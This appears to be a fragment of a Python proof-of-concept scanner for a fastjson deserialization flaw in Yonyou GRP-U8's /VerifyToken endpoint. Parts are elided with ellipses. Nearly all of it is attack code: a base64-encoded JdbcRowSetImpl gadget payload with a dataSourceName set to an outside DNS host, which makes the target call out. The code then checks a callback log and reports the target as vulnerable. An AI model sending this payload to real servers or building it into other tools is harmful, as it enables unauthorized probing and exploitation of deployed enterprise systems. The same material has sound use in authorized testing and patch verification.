...
def check(url):
    url = url.rstrip("/")
    taeget_url = urljoin(url, "/VerifyToken")
    try:
        headers = {
        ...
        fastjson_payload = """{"name":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"x":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"dns://%s","autoCommit":true}}"""%(domain)
        data = "PARAM="+base64.b64encode(fastjson_payload.encode('utf-8')).decode('utf-8')
        ...
        for i in range(0, 3):
            ...
            if domain in refresh.text:
                print(f"\033[31mDiscovered:{url}: YongYouGRP-U8_VerifyToken_fastjsoneserialization!\033[0m")
                return True
